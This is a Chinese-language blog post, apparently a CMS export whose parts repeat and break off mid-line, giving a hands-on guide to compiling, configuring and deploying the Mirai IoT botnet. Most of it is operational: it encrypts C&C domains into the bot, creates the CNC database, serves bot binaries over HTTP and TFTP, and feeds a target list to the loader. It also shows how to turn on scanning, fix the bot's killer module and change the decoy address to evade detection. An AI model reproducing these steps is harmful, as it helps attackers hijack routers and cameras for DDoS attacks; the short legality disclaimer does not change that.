的源代码分析网上已经有不少，基本从整体结构上做了较为全面的阐述，这里仅对一些细节和一些坑做一些简要说明。\\n### FAKE_ADDR\\nMirai 为了增加安全性，在源码中使用了一个假的主控地址，用来迷惑分析人员，真实的地址是从代码中进行解密并请求 DNS 解析进行获取的，假地址位于 `./mirai/bot/includes.h`中，如果对 Mirai 进行变异，可以修改这个地址，应该可以规避一些简单的检测。\\n\\n### DNS 解析\\nMirai 在 `./mirai/bot/resolv.c` 中定义了 DNS 地址，默认是请求 Google 的 DNS 服务器 8.8.8.8 进行地址解析。这个 DNS 地址可以修改，如果是在实验室内网做实验，无法使用 Google 服务的情况下，应该修改成实验室使用的 DNS，不然可能会造成实验无法成功。\\n\\n### killer 的小Bug\\nMirai 的 debug 编译和 release 编译有所区别，release 除了不输出各种信息外，其流程也并不完全一样，比如 release 对 Table 的使用并不加锁，运行 Debug 版的时候，信息输出如下：\\n<pre><code class=\\\"bash\\\">\\nDEBUG MODE YO\\n[main] We are the only process on this system!\\nlistening tun0\\n[main] Attempting[ to kicollennr] eTrcyint g tto ko illCN pCort\\n 23\\n[killer] Finding and killing processes holding port 23\\nFailed to find inode for port 23\\n[killer] Failed to kill port 23\\n[killer] Bound to tcp/23 (telnet)\\n[resolv] Got response from select\\n[resolv] Found IP address: f3251c73\\nResolved xxxx.xxx.xx to 1 IPv4 addresses\\n[main] Resolved domain\\n[main] Connected to CNC. Local address = -335435584\\n[killer] Detected we are running out of `/Mirai/mirai/debug/mirai.dbg`\\n[killer] Memory scanning processes\\n[table] Tried to access table.11 but it is locked\\nGot SIGSEGV at address: 0x0\\n</code></pre>\\n\\n其中显示想使用 table.11 ，但是并没有解密，这里应该修改 `killer.c`的 172 行，在后面加入 `table_unlock_val(TABLE_KILLER_STATUS);`，在 185 行后面加入 `table_lock_val(TABLE_KILLER_STATUS);`，重新编译运行，这个报错就会消失。\\n\\n### Bot 的扫描\\n在 debug 模式下，是观察不到扫描现象的，这是因为源码在 debug 模式中关闭了扫描功能。相关代码在 `main.c` 中。\\n<pre><code class=\\\"c\\\">\\n#ifndef DEBUG\\n    if (fork() > 0)\\n        return 0;\\n    pgid = setsid();\\n    close(STDIN);\\n    close(STDOUT);\\n    close(STDERR);\\n#endif\\n\\n    attack_init();\\n    killer_init();\\n#ifndef DEBUG\\n#ifdef MIRAI_TELNET\\n    scanner_init();\\n#endif\\n#endif\\n</code></pre>\\n\\n可以看到，不是 debug 模式的时候，才会初始化扫描器，所以将 `#ifndef DEBUG`和`#endif`注释掉，重新编译，即可开启扫描功能。\\n\\n### table 初始化的启动方式\\n\\n实验时一般使用 debug 模式编译和实验，但是如果使用 release 版本，就会发现不稳定，甚至无法成功，这是因为 debug 和 release 的初始化方式和控制方式不一样，release 采用信号控制，并且在函数入口的寻找上做了混淆，主要函数是 `unlock_tbl_if_nodebug`，如果使用 release 版本，可以做一下修改：\\n<pre><code class=\\\"c\\\">\\n#ifndef DEBUG\\n    (obf_funcs[fold])();\\n    matches = util_strcmp(argv0, buf_dst);\\n    util_zero(buf_src, sizeof (buf_src));\\n    util_zero(buf_dst, sizeof (buf_dst));\\n    return matches;\\n#else\\n    table_init();\\n    return TRUE;\\n#endif\\n</code></pre>\\n将这段代码里面的 debug 模式和 release 模式调换。\\n\\n### 关于杀灭设备中的其他病毒\\nMirai 具有独占性，一旦Mirai 感染了某一个设备，它会寻找设备上的其他僵尸网络，并将其杀掉，以让自己成为这个设备的唯一控制者，其杀死竞争者的相关代码位于 `killer.c` 中。经过解密，我发现它给其他 bot 的特征的定义是：\\n<pre><code class=\\\"bash\\\">\\nREPORT %s:%s\\nHTTPFLOOD\\nLOLNOGTFO\\nzollard\\nGETLOCALIP\\n</code></pre>\\n\\n也就是说，如果在进程路径名中发现了以上这些字符串，则杀掉那个进程。\\n\\n此外，Mirai 对自身进程名做了伪装，每次运行 Mirai，其进程名字都是随机的字符串，所以如果对 Mirai 进行变异，并且想杀掉 Mirai 的话，并不能用 Mirai 检测其他bot的方法，来检测 Mirai 自身。\\n\\n### Mirai 可能是半成品\\n\\n从 Mirai 的编译脚本和代码中分析，Mirai 定义了 TELNET 和 SSH 两个编译选项，并且代码中有相关的宏开关，但是从目前的代码看，并未发现 SSH 猜解和登陆的相关功能。\\n\\n个人猜测 Mirai 原本打算开发 TELNET 和 SSH 两个功能，但是目前只完成了一半，或许是只完成了一半，或许是 SSH 的部分原作者并未放出，真实情况不得而知。\\n\\n## Mirai 小结\\nMirai 的发布可以讲是一件大事，无论对于白帽还是黑产均是如此。本文仅对工具的配置使用做一总结，请勿用于非法用途。\\n\\n而且事实上，由于 Mirai 具有独占性，直接将源码编译应用，其实并不会有很好的实战效果，目前已经出现了众多变异版本，比如将字典缩减到两三个成功率最高的口令，针对最新漏洞进行扫描等等。\\n\\nMirai 为后续此类病毒的编写提供了一个标准的框架，真的是授人以渔啊，估计未来的变异版本和相关影响都不容小觑。\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><h2 id=\"mirai\">Mirai 简介</h2>\n<p>Mirai 是一款恶意软件，它可以使运行 Linux 的计算系统成为被远程操控的“僵尸”，以达到通过僵尸网络进行大规模网络攻击的目的。Mirai的主要感染对象是可访问网络的消费级电子设备，例如网络监控摄像机和家庭路由器等。Mirai 的源代码已经以开源的形式发布至黑客论坛。（摘自维基百科）</p>\n<p>Mirai 是目前可以通过公开渠道，或者说较为低成本的渠道，得到的最好的 DDOS 攻击工具之一，它的主要感染目标是物联网设备，由原作者在 Hackforum 论坛公开。原始帖子是 <a href=\"https://hackforums.net/showthread.php?tid=5420472\">World's Largest Net:Mirai Botnet, Client, Echo Loader, CNC source code release</a>，目前源码可以在 Github 上下载到：<a href=\"https://github.com/jgamblin/Mirai-Source-Code\">Mirai Source Code</a></p>\n<p>此外，Mirai 一词是日语的“未来”，且原作者的网名是日语的“安娜前辈”，Mirai 是在 qbot 的基础上演变而来，做了相当大的提升和完善。</p>\n<h2 id=\"mirai\">Mirai 的编译安装和配置</h2>\n<p>在原始发布帖子中，作者给出了一份简单的安装指导，在 Github 源码上，也有同样的一份副本。</p>\n<h3 id=\"mirai\">Mirai 的运行原理</h3>\n<p>在安装之前，先简要说明一下 Mirai 的整体运行原理，这有助于理解安装过程中，到底是在做些什么。</p>\n<p>Mirai 是专门用于 DDOS 的僵尸网络工具，其所控制的僵尸机，主要是路由器，网络摄像头等物联网设备。Mirai 整体分为主控端，爆破消息接收器（scanListen），加载器（Loader），下载服务器等模块。</p>\n<p>Mirai 运行时，受到感染的僵尸机会不断扫描网络，以暴力破解的方式，用内置的弱口令字典对网络上开启 Telnet 服务的设备进行尝试登陆，一旦成功，则将该设备信息上报给 scanListen，scanListen 将信息转交给 Loader，Loader 则使用收到的设备信息和对应的登陆口令登陆到该设备上，下载安装 bot 程序，之后，该设备就成为了受感染设备，并重新循环扫描，上报，下载病毒的过程。</p>\n<p>此外，设备受到感染后，会主动联系主控端，上报自身信息，完成上线，并保持心跳，以等待主控的攻击指令。</p>\n<h3 id=\"mirai\">Mirai 的安装</h3>\n<p>从运行原理和原帖的安装指导中不难看出，安装主要分为编译，主控安装，接收器加载器安装等几部分，本文以两台服务器为例，说明安装过程。一台服务器作为主控，另一台服务器作为加载器，接收器，以及下载服务器。后文有以下约定：</p>\n<ul>\n<li>主控服务器域名：<code>Master_domain</code></li>\n<li>主控服务器IP：<code>Master_IP</code></li>\n<li>Loader服务器域名：<code>Loader_domain</code></li>\n<li>Loader服务器IP：<code>Loader_IP</code></li>\n</ul>\n<h4 id=\"bot\">修改源码配置 Bot</h4>\n<p>进入源码目录，首先先编译一下</p>\n<pre><code class=\"bash\">./build.sh debug telnet\n</code></pre>\n<p>有交叉编译的错误可以忽略，主要是将加密工具编译出来，用于加密字符串。之后运行：</p>\n<pre><code class=\"bash\">./debug/enc string Master_domain\n./debug/enc string Loader_domain\n</code></pre>\n<p>将两个输出记录下来，修改 <code>./mirai/bot/table.c</code></p>\n<pre><code class=\"c\">add_entry(TABLE_CNC_DOMAIN, \"\\x41...\", 30);\nadd_entry(TABLE_SCAN_CB_DOMAIN, \"\\x50...\", 29);\n</code></pre>\n<p>将两个域名的加密结果填到字符串里面。</p>\n<p>修改 <code>./mirai/cnc/main.go</code></p>\n<pre><code>const DatabaseAddr string   = \"127.0.0.1\"\nconst DatabaseUser string   = \"root\"\nconst DatabasePass string   = \"password\"\nconst DatabaseTable string  = \"mirai\"\n</code></pre>\n<p>将数据库用户名和密码改成你自己要设定的密码，当然用默认的也可以，如果用默认的，则此处不需要修改。</p>\n<p>修改 <code>./dlr/main.c</code></p>\n<pre><code>#define HTTP_SERVER utils_inet_addr(127,0,0,1)\n</code></pre>\n<p>将 IP 修改为 Loader 服务器的 IP：<code>Loader_IP</code></p>\n<p>修改 <code>./loader/src/main.c</code></p>\n<pre><code>addrs[0] = inet_addr(\"192.168.0.1\");\naddrs[1] = inet_addr(\"192.168.1.1\");\n</code></pre>\n<p>这两个 IP 是 Loader 要绑定的 IP，将 IP 修改为 Loader 服务器的 IP：<code>Loader_IP</code></p>\n<pre><code>if ((srv = server_create(sysconf(_SC_NPROCESSORS_ONLN), addrs_len, addrs, 1024 * 64, \"100.200.100.100\", 80, \"100.200.100.100\")) == NULL)\n{\n    printf(\"Failed to initialize server. Aborting\\n\");\n    return 1;\n}\n</code></pre>\n<p>这两个 IP 分别是提供 HTTP 服务和 TFTP 服务的 IP，同样将 IP 修改为 Loader 服务器的IP：<code>Loader_IP</code></p>\n<p>这里需要注意的是，如果你配置有单独的 HTTP 服务器或者 TFTP 服务器，那么 IP 要填写对应的服务器地址，我这里都一样是因为把这些服务都放在了一台服务器上。</p>\n<p>此时，针对此次配置需要的修改都已完成。</p>\n<h4 id=\"\">配置主控服务器和编译环境</h4>\n<pre><code class=\"bash\">\napt-get install build-essential \napt-get install mysql-server mysql-client\n</code></pre>\n<p>数据库密码设定要和刚才的修改保持一致。进入数据库，建立需要的表。</p>\n<pre><code>\nCREATE DATABASE mirai;\nuse mirai\n\nCREATE TABLE `history` (\n  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,\n  `user_id` int(10) unsigned NOT NULL,\n  `time_sent` int(10) unsigned NOT NULL,\n  `duration` int(10) unsigned NOT NULL,\n  `command` text NOT NULL,\n  `max_bots` int(11) DEFAULT '-1',\n  PRIMARY KEY (`id`),\n  KEY `user_id` (`user_id`)\n);\n\nCREATE TABLE `users` (\n  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,\n  `username` varchar(32) NOT NULL,\n  `password` varchar(32) NOT NULL,\n  `duration_limit` int(10) unsigned DEFAULT NULL,\n  `cooldown` int(10) unsigned NOT NULL,\n  `wrc` int(10) unsigned DEFAULT NULL,\n  `last_paid` int(10) unsigned NOT NULL,\n  `max_bots` int(11) DEFAULT '-1',\n  `admin` int(10) unsigned DEFAULT '0',\n  `intvl` int(10) unsigned DEFAULT '30',\n  `api_key` text,\n  PRIMARY KEY (`id`),\n  KEY `username` (`username`)\n);\n\nCREATE TABLE `whitelist` (\n  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,\n  `prefix` varchar(16) DEFAULT NULL,\n  `netmask` tinyint(3) unsigned DEFAULT NULL,\n  PRIMARY KEY (`id`),\n  KEY `prefix` (`prefix`)\n);\n\nINSERT INTO users VALUES (NULL, 'username', 'password', 0, 0, 0, 0, -1, 1, 30, '');\n</code></pre>\n<p>其中 <code>username</code> 和 <code>password</code> 是将来登陆主控的口令，可以自己根据喜好设定。然后继续配置主控：</p>\n<pre><code>\napt-get install golang\napt-get electric-fence\napt-get install git\n\nmkdir /etc/xcompile\ncd /etc/xcompile\n \nwget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv4l.tar.bz2\nwget http://distro.ibiblio.org/slitaz/sources/packages/c/cross-compiler-armv6l.tar.bz2\nwget https://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv5l.tar.bz2\nwget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i586.tar.bz2\nwget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i686.tar.bz2\nwget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-m68k.tar.bz2\nwget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2\nwget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2\nwget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2\nwget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2\nwget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sparc.tar.bz2\n \ntar -jxf cross-compiler-armv4l.tar.bz2\ntar -jxf cross-compiler-armv5l.tar.bz2 \ntar -jxf cross-compiler-armv6l.tar.bz2 \ntar -jxf cross-compiler-i586.tar.bz2\ntar -jxf cross-compiler-i686.tar.bz2\ntar -jxf cross-compiler-m68k.tar.bz2\ntar -jxf cross-compiler-mips.tar.bz2\ntar -jxf cross-compiler-mipsel.tar.bz2\ntar -jxf cross-compiler-powerpc.tar.bz2\ntar -jxf cross-compiler-sh4.tar.bz2\ntar -jxf cross-compiler-sparc.tar.bz2\n \nrm *.tar.bz2\nmv cross-compiler-armv4l armv4l\nmv cross-compiler-armv5l armv5l\nmv cross-compiler-armv6l armv6l\nmv cross-compiler-i586 i586\nmv cross-compiler-i686 i686\nmv cross-compiler-m68k m68k\nmv cross-compiler-mips mips\nmv cross-compiler-mipsel mipsel\nmv cross-compiler-powerpc powerpc\nmv cross-compiler-sh4 sh4\nmv cross-compiler-sparc sparc\n\nexport PATH=$PATH:/etc/xcompile/armv4l/bin/\nexport PATH=$PATH:/etc/xcompile/armv5l/bin/\nexport PATH=$PATH:/etc/xcompile/armv6l/bin/\nexport PATH=$PATH:/etc/xcompile/i586/bin/\nexport PATH=$PATH:/etc/xcompile/i686/bin/\nexport PATH=$PATH:/etc/xcompile/m68k/bin/\nexport PATH=$PATH:/etc/xcompile/mips/bin/\nexport PATH=$PATH:/etc/xcompile/mipsel/bin/\nexport PATH=$PATH:/etc/xcompile/powerpc/bin/\nexport PATH=$PATH:/etc/xcompile/powerpc-440fp/bin/\nexport PATH=$PATH:/etc/xcompile/sh4/bin/\nexport PATH=$PATH:/etc/xcompile/sparc/bin/\nexport GOPATH=$HOME/Documents/go\n\ngo get github.com/go-sql-driver/mysql\ngo get github.com/mattn/go-shellwords\n</code></pre>\n<p>环境和主控的配置都已经完成，此时再次编译源代码，然后运行：</p>\n<pre><code class=\"bash\">./mirai/debug/cnc\n</code></pre>\n<p>此时主控可以启动，登录时显示的是俄文，输入用户名和密码即可登陆。</p>\n<h4 id=\"loader\">配置 Loader 服务器</h4>\n<p>Loader 服务器上包括 HTTP，TFTP，接收器，加载器四个模块。将刚才编译出来的 scanListen，以及 loader 文件夹下和dlr文件夹下编译出来的对应文件拷贝到这台服务器即可。</p>\n<p>配置 HTTP</p>\n<pre><code class=\"bash\">aptitude install apache2\n</code></pre>\n<p>在 apache 根目录建立<code>bins</code>文件夹，将编译出的不同平台的 bot 病毒放入，以供下载。</p>\n<p>配置 TFTP</p>\n<pre><code class=\"bash\">apt-get install -y tftpd-hpa\nvim /etc/default/tftpd-hpa\n\nTFTP_USERNAME=\"tftp\"\nTFTP_DIRECTORY=\"/tftpboot\"\nTFTP_ADDRESS=\"0.0.0.0:69\"\nTFTP_OPTIONS=\"--secure --create\"\n\nservice tftpd-hpa restart\n</code></pre>\n<p>TFTP 的更多内容参见<a href=\"http://www.routingloops.co.uk/linux/tftp-on-ubuntu-14-04-lts-server/\">这里</a>，同样将病毒程序放入自己设置的 TFTP 根目录，以供下载。</p>\n<p>配置完毕后，在本机和另外一台机器上运行</p>\n<pre><code class=\"bash\">/bin/busybox wget http:Loader_IP:80/bins/mirai.ppc -O dvrHelper\n/bin/busybox tftp -g -l dvrHelp -r mirai.ppc Loader_IP\n</code></pre>\n<p>运行成功则证明两个服务配置正确。如果此时手里有可供感染的设备列表的话，运行：</p>\n<pre><code class=\"bash\">cat file.txt | ./loader\n</code></pre>\n<p>可以启动 Mirai。</p>\n<h2 id=\"mirai\">Mirai 的部分源码分析</h2>\n<p>Mirai 的源代码分析网上已经有不少，基本从整体结构上做了较为全面的阐述，这里仅对一些细节和一些坑做一些简要说明。</p>\n<h3 id=\"fake_addr\">FAKE_ADDR</h3>\n<p>Mirai 为了增加安全性，在源码中使用了一个假的主控地址，用来迷惑分析人员，真实的地址是从代码中进行解密并请求 DNS 解析进行获取的，假地址位于 <code>./mirai/bot/includes.h</code>中，如果对 Mirai 进行变异，可以修改这个地址，应该可以规避一些简单的检测。</p>\n<h3 id=\"dns\">DNS 解析</h3>\n<p>Mirai 在 <code>./mirai/bot/resolv.c</code> 中定义了 DNS 地址，默认是请求 Google 的 DNS 服务器 8.8.8.8 进行地址解析。这个 DNS 地址可以修改，如果是在实验室内网做实验，无法使用 Google 服务的情况下，应该修改成实验室使用的 DNS，不然可能会造成实验无法成功。</p>\n<h3 id=\"killerbug\">killer 的小Bug</h3>\n<p>Mirai 的 debug 编译和 release 编译有所区别，release 除了不输出各种信息外，其流程也并不完全一样，比如 release 对 Table 的使用并不加锁，运行 Debug 版的时候，信息输出如下：</p>\n<pre><code class=\"bash\">\nDEBUG MODE YO\n[main] We are the only process on this system!\nlistening tun0\n[main] Attempting[ to kicollennr] eTrcyint g tto ko illCN pCort\n 23\n[killer] Finding and killing processes holding port 23\nFailed to find inode for port 23\n[killer] Failed to kill port 23\n[killer] Bound to tcp/23 (telnet)\n[resolv] Got response from select\n[resolv] Found IP address: f3251c73\nResolved xxxx.xxx.xx to 1 IPv4 addresses\n[main] Resolved domain\n[main] Connected to CNC. Local address = -335435584\n[killer] Detected we are running out of `/Mirai/mirai/debug/mirai.dbg`\n[killer] Memory scanning processes\n[table] Tried to access table.11 but it is locked\nGot SIGSEGV at address: 0x0\n</code></pre>\n<p>其中显示想使用 table.11 ，但是并没有解密，这里应该修改 <code>killer.c</code>的 172 行，在后面加入 <code>table_unlock_val(TABLE_KILLER_STATUS);</code>，在 185 行后面加入 <code>table_lock_val(TABLE_KILLER_STATUS);</code>，重新编译运行，这个报错就会消失。</p>\n<h3 id=\"bot\">Bot 的扫描</h3>\n<p>在 debug 模式下，是观察不到扫描现象的，这是因为源码在 debug 模式中关闭了扫描功能。相关代码在 <code>main.c</code> 中。</p>\n<pre><code class=\"c\">\n#ifndef DEBUG\n    if (fork() > 0)\n        return 0;\n    pgid = setsid();\n    close(STDIN);\n    close(STDOUT);\n    close(STDERR);\n#endif\n\n    attack_init();\n    killer_init();\n#ifndef DEBUG\n#ifdef MIRAI_TELNET\n    scanner_init();\n#endif\n#endif\n</code></pre>\n<p>可以看到，不是 debug 模式的时候，才会初始化扫描器，所以将 <code>#ifndef DEBUG</code>和<code>#endif</code>注释掉，重新编译，即可开启扫描功能。</p>\n<h3 id=\"table\">table 初始化的启动方式</h3>\n<p>实验时一般使用 debug 模式编译和实验，但是如果使用 release 版本，就会发现不稳定，甚至无法成功，这是因为 debug 和 release 的初始化方式和控制方式不一样，release 采用信号控制，并且在函数入口的寻找上做了混淆，主要函数是 <code>unlock_tbl_if_nodebug</code>，如果使用 release 版本，可以做一下修改：</p>\n<pre><code class=\"c\">\n#ifndef DEBUG\n    (obf_funcs[fold])();\n    matches = util_strcmp(argv0, buf_dst);\n    util_zero(buf_src, sizeof (buf_src));\n    util_zero(buf_dst, sizeof (buf_dst));\n    return matches;\n#else\n    table_init();\n    return TRUE;\n#endif\n</code></pre>\n<p>将这段代码里面的 debug 模式和 release 模式调换。</p>\n<h3 id=\"\">关于杀灭设备中的其他病毒</h3>\n<p>Mirai 具有独占性，一旦Mirai 感染了某一个设备，它会寻找设备上的其他僵尸网络，并将其杀掉，以让自己成为这个设备的唯一控制者，其杀死竞争者的相关代码位于 <code>killer.c</code> 中。经过解密，我发现它给其他 bot 的特征的定义是：</p>\n<pre><code class=\"bash\">\nREPORT %s:%s\nHTTPFLOOD\nLOLNOGTFO\nzollard\nGETLOCALIP\n</code></pre>\n<p>也就是说，如果在进程路径名中发现了以上这些字符串，则杀掉那个进程。</p>\n<p>此外，Mirai 对自身进程名做了伪装，每次运行 Mirai，其进程名字都是随机的字符串，所以如果对 Mirai 进行变异，并且想杀掉 Mirai 的话，并不能用 Mirai 检测其他bot的方法，来检测 Mirai 自身。</p>\n<h3 id=\"mirai\">Mirai 可能是半成品</h3>\n<p>从 Mirai 的编译脚本和代码中分析，Mirai 定义了 TELNET 和 SSH 两个编译选项，并且代码中有相关的宏开关，但是从目前的代码看，并未发现 SSH 猜解和登陆的相关功能。</p>\n<p>个人猜测 Mirai 原本打算开发 TELNET 和 SSH 两个功能，但是目前只完成了一半，或许是只完成了一半，或许是 SSH 的部分原作者并未放出，真实情况不得而知。</p>\n<h2 id=\"mirai\">Mirai 小结</h2>\n<p>Mirai 的发布可以讲是一件大事，无论对于白帽还是黑产均是如此。本文仅对工具的配置使用做一总结，请勿用于非法用途。</p>\n<p>而且事实上，由于 Mirai 具有独占性，直接将源码编译应用，其实并不会有很好的实战效果，目前已经出现了众多变异版本，比如将字典缩减到两三个成功率最高的口令，针对最新漏洞进行扫描等等。</p>\n<p>Mirai 为后续此类病毒的编写提供了一个标准的框架，真的是授人以渔啊，估计未来的变异版本和相关影响都不容小觑。</p>\n</div>","amp":"29","plaintext":"Mirai 简介\nMirai 是一款恶意软件，它可以使运行 Linux\n的计算系统成为被远程操控的“僵尸”，以达到通过僵尸网络进行大规模网络攻击的目的。Mirai的主要感染对象是可访问网络的消费级电子设备，例如网络监控摄像机和家庭路由器等。Mirai\n的源代码已经以开源的形式发布至黑客论坛。（摘自维基百科）\n\nMirai 是目前可以通过公开渠道，或者说较为低成本的渠道，得到的最好的 DDOS 攻击工具之一，它的主要感染目标是物联网设备，由原作者在 Hackforum\n论坛公开。原始帖子是 World's Largest Net:Mirai Botnet, Client, Echo Loader, CNC source\ncode release [https://hackforums.net/showthread.php?tid=5420472]，目前源码可以在 Github\n上下载到：Mirai Source Code [https://github.com/jgamblin/Mirai-Source-Code]\n\n此外，Mirai 一词是日语的“未来”，且原作者的网名是日语的“安娜前辈”，Mirai 是在 qbot 的基础上演变而来，做了相当大的提升和完善。\n\nMirai 的编译安装和配置\n在原始发布帖子中，作者给出了一份简单的安装指导，在 Github 源码上，也有同样的一份副本。\n\nMirai 的运行原理\n在安装之前，先简要说明一下 Mirai 的整体运行原理，这有助于理解安装过程中，到底是在做些什么。\n\nMirai 是专门用于 DDOS 的僵尸网络工具，其所控制的僵尸机，主要是路由器，网络摄像头等物联网设备。Mirai\n整体分为主控端，爆破消息接收器（scanListen），加载器（Loader），下载服务器等模块。\n\nMirai 运行时，受到感染的僵尸机会不断扫描网络，以暴力破解的方式，用内置的弱口令字典对网络上开启 Telnet\n服务的设备进行尝试登陆，一旦成功，则将该设备信息上报给 scanListen，scanListen 将信息转交给 Loader，Loader\n则使用收到的设备信息和对应的登陆口令登陆到该设备上，下载安装 bot 程序，之后，该设备就成为了受感染设备，并重新循环扫描，上报，下载病毒的过程。\n\n此外，设备受到感染后，会主动联系主控端，上报自身信息，完成上线，并保持心跳，以等待主控的攻击指令。\n\nMirai 的安装\n从运行原理和原帖的安装指导中不难看出，安装主要分为编译，主控安装，接收器加载器安装等几部分，本文以两台服务器为例，说明安装过程。一台服务器作为主控，另一台服务器作为加载器，接收器，以及下载服务器。后文有以下约定：\n\n * 主控服务器域名：Master_domain\n * 主控服务器IP：Master_IP\n * Loader服务器域名：Loader_domain\n * Loader服务器IP：Loader_IP\n\n修改源码配置 Bot\n进入源码目录，首先先编译一下\n\n./build.sh debug telnet\n\n\n有交叉编译的错误可以忽略，主要是将加密工具编译出来，用于加密字符串。之后运行：\n\n./debug/enc string Master_domain\n./debug/enc string Loader_domain\n\n\n将两个输出记录下来，修改 ./mirai/bot/table.c\n\nadd_entry(TABLE_CNC_DOMAIN, \"\\x41...\", 30);\nadd_entry(TABLE_SCAN_CB_DOMAIN, \"\\x50...\", 29);\n\n\n将两个域名的加密结果填到字符串里面。\n\n修改 ./mirai/cnc/main.go\n\nconst DatabaseAddr string   = \"127.0.0.1\"\nconst DatabaseUser string   = \"root\"\nconst DatabasePass string   = \"password\"\nconst DatabaseTable string  = \"mirai\"\n\n\n将数据库用户名和密码改成你自己要设定的密码，当然用默认的也可以，如果用默认的，则此处不需要修改。\n\n修改 ./dlr/main.c\n\n#define HTTP_SERVER utils_inet_addr(127,0,0,1)\n\n\n将 IP 修改为 Loader 服务器的 IP：Loader_IP\n\n修改 ./loader/src/main.c\n\naddrs[0] = inet_addr(\"192.168.0.1\");\naddrs[1] = inet_addr(\"192.168.1.1\");\n\n\n这两个 IP 是 Loader 要绑定的 IP，将 IP 修改为 Loader 服务器的 IP：Loader_IP\n\nif ((srv = server_create(sysconf(_SC_NPROCESSORS_ONLN), addrs_len, addrs, 1024 * 64, \"100.200.100.100\", 80, \"100.200.100.100\")) == NULL)\n{\n    printf(\"Failed to initialize server. Aborting\\n\");\n    return 1;\n}\n\n\n这两个 IP 分别是提供 HTTP 服务和 TFTP 服务的 IP，同样将 IP 修改为 Loader 服务器的IP：Loader_IP\n\n这里需要注意的是，如果你配置有单独的 HTTP 服务器或者 TFTP 服务器，那么 IP\n要填写对应的服务器地址，我这里都一样是因为把这些服务都放在了一台服务器上。\n\n此时，针对此次配置需要的修改都已完成。\n\n配置主控服务器和编译环境\n\napt-get install build-essential \napt-get install mysql-server mysql-client\n\n\n数据库密码设定要和刚才的修改保持一致。进入数据库，建立需要的表。\n\n\nCREATE DATABASE mirai;\nuse mirai\n\nCREATE TABLE `history` (\n  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,\n  `user_id` int(10) unsigned NOT NULL,\n  `time_sent` int(10) unsigned NOT NULL,\n  `duration` int(10) unsigned NOT NULL,\n  `command` text NOT NULL,\n  `max_bots` int(11) DEFAULT '-1',\n  PRIMARY KEY (`id`),\n  KEY `user_id` (`user_id`)\n);\n\nCREATE TABLE `users` (\n  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,\n  `username` varchar(32) NOT NULL,\n  `password` varchar(32) NOT NULL,\n  `duration_limit` int(10) unsigned DEFAULT NULL,\n  `cooldown` int(10) unsigned NOT NULL,\n  `wrc` int(10) unsigned DEFAULT NULL,\n  `last_paid` int(10) unsigned NOT NULL,\n  `max_bots` int(11) DEFAULT '-1',\n  `admin` int(10) unsigned DEFAULT '0',\n  `intvl` int(10) unsigned DEFAULT '30',\n  `api_key` text,\n  PRIMARY KEY (`id`),\n  KEY `username` (`username`)\n);\n\nCREATE TABLE `whitelist` (\n  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,\n  `prefix` varchar(16) DEFAULT NULL,\n  `netmask` tinyint(3) unsigned DEFAULT NULL,\n  PRIMARY KEY (`id`),\n  KEY `prefix` (`prefix`)\n);\n\nINSERT INTO users VALUES (NULL, 'username', 'password', 0, 0, 0, 0, -1, 1, 30, '');\n\n\n其中 username  和 password  是将来登陆主控的口令，可以自己根据喜好设定。然后继续配置主控：\n\n\napt-get install golang\napt-get electric-fence\napt-get install git\n\nmkdir /etc/xcompile\ncd /etc/xcompile\n \nwget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv4l.tar.bz2\nwget http://distro.ibiblio.org/slitaz/sources/packages/c/cross-compiler-armv6l.tar.bz2\nwget https://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv5l.tar.bz2\nwget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i586.tar.bz2\nwget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i686.tar.bz2\nwget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-m68k.tar.bz2\nwget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2\nwget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2\nwget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2\nwget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2\nwget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sparc.tar.bz2\n \ntar -jxf cross-compiler-armv4l.tar.bz2\ntar -jxf cross-compiler-armv5l.tar.bz2 \ntar -jxf cross-compiler-armv6l.tar.bz2 \ntar -jxf cross-compiler-i586.tar.bz2\ntar -jxf cross-compiler-i686.tar.bz2\ntar -jxf cross-compiler-m68k.tar.bz2\ntar -jxf cross-compiler-mips.tar.bz2\ntar -jxf cross-compiler-mipsel.tar.bz2\ntar -jxf cross-compiler-powerpc.tar.bz2\ntar -jxf cross-compiler-sh4.tar.bz2\ntar -jxf cross-compiler-sparc.tar.bz2\n \nrm *.tar.bz2\nmv cross-compiler-armv4l armv4l\nmv cross-compiler-armv5l armv5l\nmv cross-compiler-armv6l armv6l\nmv cross-compiler-i586 i586\nmv cross-compiler-i686 i686\nmv cross-compiler-m68k m68k\nmv cross-compiler-mips mips\nmv cross-compiler-mipsel mipsel\nmv cross-compiler-powerpc powerpc\nmv cross-compiler-sh4 sh4\nmv cross-compiler-sparc sparc\n\nexport PATH=$PATH:/etc/xcompile/armv4l/bin/\nexport PATH=$PATH:/etc/xcompile/armv5l/bin/\nexport PATH=$PATH:/etc/xcompile/armv6l/bin/\nexport PATH=$PATH:/etc/xcompile/i586/bin/\nexport PATH=$PATH:/etc/xcompile/i686/bin/\nexport PATH=$PATH:/etc/xcompile/m68k/bin/\nexport 